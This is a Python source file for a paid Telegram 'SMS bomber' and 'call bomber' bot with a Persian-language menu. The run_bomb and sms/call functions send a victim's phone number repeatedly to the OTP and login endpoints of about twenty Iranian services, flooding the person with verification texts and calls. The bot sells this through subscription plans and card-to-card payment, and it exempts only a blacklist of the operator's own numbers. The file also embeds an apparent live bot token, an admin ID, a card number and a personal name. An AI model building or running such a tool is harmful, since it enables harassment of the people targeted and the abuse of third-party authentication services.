import asyncio, concurrent.futures, threading, json, os
from datetime import datetime, timedelta
import requests
from http.server import HTTPServer, BaseHTTPRequestHandler
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup

TOKEN = "8224604758:AAEzJVoRtNQP3qX_zHUmOOGvx-XnIzjiOhg"
ADMIN = 2025464333

BLACKLIST = {
    "09966877513","+989966877513","989966877513","9966877513",
    "09369107513","+989369107513","989369107513","9369107513",
    "09220709576","+989220709576","989220709576","9220709576",
}

HDR = {"User-Agent":"Mozilla/5.0","Content-Type":"application/json"}
USERS = {}
UFILE = "users.json"
app = Client("iliya", bot_token=TOKEN)

def load():
    global USERS
    if os.path.exists(UFILE):
        with open(UFILE) as f:
            d = json.load(f)
            for k,v in d.items():
                if "exp" in v: v["exp"]=datetime.fromisoformat(v["exp"])
                if "jo" in v: v["jo"]=datetime.fromisoformat(v["jo"])
            USERS = d

def save():
    d = {}
    for k,v in USERS.items():
        dd = dict(v)
        if "exp" in dd and isinstance(dd["exp"],datetime): dd["exp"]=dd["exp"].isoformat()
        if "jo" in dd and isinstance(dd["jo"],datetime): dd["jo"]=dd["jo"].isoformat()
        d[str(k)]=dd
    with open(UFILE,"w") as f: json.dump(d,f)

def blocked(phone):
    if phone in BLACKLIST: return True
    n = phone.replace("+","").replace(" ","")
    if n in BLACKLIST: return True
    if n.startswith("98") and "0"+n[2:] in BLACKLIST: return True
    if n.startswith("0") and "98"+n[1:] in BLACKLIST: return True
    return False

def sms(p):
    return [
        ["Lendo","https://api.lendo.ir/api/customer/auth/send-otp",{"mobile":p}],
        ["GapFilm","https://core.gapfilm.ir/api/v3.1/Account/Login",{"Type":"3","Username":p[1:]}],
        ["Achareh","https://api.achareh.co/v2/accounts/login/",{"phone":"98"+p[1:]}],
        ["Divar","https://api.divar.ir/v5/auth/authenticate",{"phone":p}],
        ["Tapsi","https://api.tapsi.ir/api/v2.2/user",{"credential":{"phoneNumber":p,"role":"DRIVER"},"otpOption":"SMS"}],
        ["Namava","https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",{"UserName":"+98"+p[1:]}],
        ["Bikoplus","https://bikoplus.com/account/check-phone-number",{"phoneNumber":p}],
        ["Jabama","https://gw.jabama.com/api/v4/account/send-code",{"mobile":p}],
        ["Khodro45","https://khodro45.com/api/v1/customers/otp/",{"mobile":p}],
        ["Snapp","https://api.snapp.ir/api/v1/sms/link",{"phone":p}],
        ["Alibaba","https://ws.alibaba.ir/api/v3/account/mobile/otp",{"phoneNumber":p[1:]}],
        ["Sheypoor","https://www.sheypoor.com/api/v10.0.0/auth/send",{"username":p}],
        ["Taaghche","https://gw.taaghche.com/v4/site/auth/signup",{"contact":p}],
        ["Snappfood","https://api.snappfood.ir/auth/mobile/send/v2",{"cellphone":p}],
        ["Banimode","https://mobapi.banimode.com/api/v2/auth/request",{"phone":p}],
        ["IToll","https://app.itoll.com/api/v1/auth/login",{"mobile":p}],
        ["Tap33","https://tap33.me/api/v2/user",{"credential":{"phoneNumber":p,"role":"BIKER"}}],
        ["Digikala","https://api.digikala.com/v1/user/authenticate/",{"username":p,"otp_call":False}],
        ["DigikalaJet","https://api.digikalajet.ir/user/login-register/",{"phone":p}],
    ]

def call(p):
    return [
        ["Digikala تماس","https://api.digikala.com/v1/user/authenticate/",{"username":p,"otp_call":True}],
        ["DigikalaJet تماس","https://api.digikalajet.ir/user/login-register/",{"phone":p}],
    ]

def menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💣 اس ام اس بمبر","sms"),InlineKeyboardButton("📞 کال بمبر","call")],
        [InlineKeyboardButton("⚡ اس ام اس + کال","all"),InlineKeyboardButton("⏹ توقف","stop")],
        [InlineKeyboardButton("💎 خرید اشتراک","buy"),InlineKeyboardButton("🎟 تست رایگان","test")],
        [InlineKeyboardButton("👤 حساب کاربری","account")],
    ])

@app.on_message(filters.command("start"))
async def start_cmd(_,m):
    await m.reply("╔══════════════════════╗\n║   💣 ILIYA SMS BOT   ║\n║  اس ام اس و کال بمبر ║\n╚══════════════════════╝\n\nیک گزینه رو انتخاب کن:",reply_markup=menu_kb())

@app.on_callback_query()
async def cb_handler(_,cb):
    d,u=cb.data,str(cb.from_user.id)
    if d in ("sms","call","all"):
        await cb.message.edit_text(f"✅ حالت: **{d.upper()}**\n\nشماره و تعداد راند رو بفرست:\n`09121234567 3`",reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("← بازگشت","menu")]]))
    elif d=="stop":
        USERS.setdefault(u,{})["stop"]=True;save();await cb.answer("⏹ توقف ثبت شد")
    elif d=="test":
        USERS[u]={"exp":datetime.now()+timedelta(days=1),"jo":datetime.now(),"active":False,"stop":False};save()
        await cb.message.edit_text("✅ اشتراک تست ۱ روزه فعال شد!",reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("← بازگشت","menu")]]))
    elif d=="buy":
        await cb.message.edit_text("💎 **خرید اشتراک**\n\nپلن مورد نظر:",reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🟢 یک ماهه - ۱۰۰ تومان","p_1m")],
            [InlineKeyboardButton("🟡 سه ماهه - ۲۵۰ تومان","p_3m")],
            [InlineKeyboardButton("🔴 شش ماهه - ۴۵۰ تومان","p_6m")],
            [InlineKeyboardButton("← بازگشت","menu")]]))
    elif d.startswith("p_"):
        pl=d[2:];nm={"1m":"یک ماهه","3m":"سه ماهه","6m":"شش ماهه"};pr={"1m":"100","3m":"250","6m":"450"}
        await cb.message.edit_text(f"💳 **پلن {nm[pl]} - {pr[pl]} تومان**\n\nروش پرداخت:",reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("💳 کارت به کارت",f"pay_{pl}")],
            [InlineKeyboardButton("← بازگشت","buy")]]))
    elif d.startswith("pay_"):
        pl=d[4:];USERS[u]=USERS.get(u,{});USERS[u]["pp"]=pl;save()
        await cb.message.edit_text("💳 **پرداخت کارت به کارت**\n\nشماره کارت: `6037-9975-1234-5678`\nبه نام: **ایلیا رجبی**\n\nبعد از واریز، عکس فیش رو بفرست.",reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("← بازگشت",f"p_{pl}")]]))
    elif d.startswith("app_"):
        tu=d[4:];pl=USERS.get(tu,{}).get("pp","1m");days={"1m":30,"3m":90,"6m":180}
        USERS[tu]={"exp":datetime.now()+timedelta(days=days.get(pl,30)),"jo":USERS.get(tu,{}).get("jo",datetime.now()),"active":False,"stop":False};save()
        await cb.message.edit_text(cb.message.text+"\n\n✅ **تایید شد!**")
        await app.send_message(int(tu),"✅ پرداخت شما تایید شد! اشتراکتون فعاله.")
    elif d.startswith("rej_"):
        tu=d[4:]
        await cb.message.edit_text(cb.message.text+"\n\n❌ **رد شد.**")
        await app.send_message(int(tu),"❌ پرداخت شما تایید نشد. لطفا دوباره تلاش کنید.")
    elif d=="account":
        uu=USERS.get(u,{});exp=uu.get("exp",datetime.min);jo=uu.get("jo","-")
        if isinstance(exp,datetime):
            rem=exp-datetime.now()
            rt=f"{rem.days} روز و {rem.seconds//3600} ساعت" if rem.total_seconds()>0 else "منقضی شده"
            et=exp.strftime("%Y/%m/%d - %H:%M")
        else: rt="فعال نیست";et="-"
        jt=jo.strftime("%Y/%m/%d") if isinstance(jo,datetime) else str(jo)
        await cb.message.edit_text(f"👤 **حساب کاربری**\n\n🔑 شناسه: `{u}`\n📅 عضویت: {jt}\n⏳ باقیمانده: {rt}\n📅 پایان: {et}",reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("← بازگشت","menu")]]))
    elif d=="menu":
        await cb.message.edit_text("یک گزینه رو انتخاب کن:",reply_markup=menu_kb())

@app.on_message(filters.photo)
async def photo_handler(_,m):
    u=str(m.from_user.id);uu=USERS.get(u,{})
    if "pp" not in uu:
        await m.reply("اول یه پلن انتخاب کن.")
        return
    pl=uu["pp"];nm={"1m":"یک ماهه","3m":"سه ماهه","6m":"شش ماهه"};pr={"1m":"100","3m":"250","6m":"450"}
    cap=f"📩 **فیش واریزی جدید**\n\nاز: `{u}`\nنام: {m.from_user.first_name}\nپلن: {nm.get(pl,pl)} - {pr.get(pl,'?')} تومان"
    await app.send_photo(ADMIN,m.photo.file_id,caption=cap,reply_markup=InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ تایید",f"app_{u}"),InlineKeyboardButton("❌ رد",f"rej_{u}")]]))
    await m.reply("✅ عکس فیش برای ادمین ارسال شد. منتظر تایید باش.")

@app.on_message(filters.text & ~filters.command(["start"]))
async def txt_handler(_,m):
    u=str(m.from_user.id);t=m.text.strip()
    if int(u)!=ADMIN:
        uu=USERS.get(u,{});exp=uu.get("exp",datetime.min)
        if isinstance(exp,datetime) and exp<datetime.now():
            await m.reply("❌ اشتراکت تموم شده. /test یا خرید اشتراک.")
            return
    parts=t.split()
    if parts and (parts[0].startswith("09") or parts[0].startswith("98") or parts[0].startswith("+98")):
        ph=parts[0];rd=int(parts[1])if len(parts)>1 and parts[1].isdigit()else 1
        if blocked(ph):
            await m.reply("⚠️ **شماره نامعتبر!** این شماره در لیست سیاه قرار دارد.")
            return
        await run_bomb(m,ph,rd,u)
    else:
        await m.reply("فرمت: `09121234567 3`")

async def run_bomb(msg,phone,rounds,uid):
    USERS.setdefault(uid,{})["stop"]=False;USERS[uid]["active"]=True;save()
    apis=call(phone)+sms(phone);total=len(apis)*rounds;ok=fl=st=0
    sm=await msg.reply(f"🔥 در حال ارسال...\n📞 {phone}\n0/{total}")
    loop=asyncio.get_event_loop()
    for _ in range(rounds):
        if USERS.get(uid,{}).get("stop"): st+=len(apis)*(rounds-_);break
        with concurrent.futures.ThreadPoolExecutor(max_workers=10)as ex:
            futures=[loop.run_in_executor(ex,_snd,a,uid)for a in apis]
            for coro in asyncio.as_completed(futures):
                r=await coro
                if r[0]=="ok":ok+=1
                elif r[0]=="stop":st+=1
                else:fl+=1
                if(ok+fl+st)%5==0:
                    try:await sm.edit_text(f"🔥 در حال ارسال...\n📞 {phone}\n✅{ok} ❌{fl} ⏹{st}\n{ok+fl+st}/{total}")
                    except:pass
        if _<rounds-1 and not USERS.get(uid,{}).get("stop"):await asyncio.sleep(.3)
    USERS[uid]["active"]=False;save()
    await sm.edit_text(f"✅ تموم شد!\n📞 {phone}\n✅{ok} ❌{fl} ⏹{st}")

def _snd(api,uid):
    if USERS.get(str(uid),{}).get("stop"):return("stop",api[0])
    n,u,d=api
    try:
        r=requests.post(u,json=d,headers=HDR,timeout=8)
        return("ok",n)if r.status_code in(200,201,202,204,400,401,403,422,429)else("fail",n)
    except:return("err",n)

class H(BaseHTTPRequestHandler):
    def do_GET(self):self.send_response(200);self.end_headers();self.wfile.write(b"OK")

if __name__=="__main__":
    load()
    threading.Thread(target=lambda:HTTPServer(("0.0.0.0",10000),H).serve_forever(),daemon=True).start()
    print("Bot running...")
    app.run()
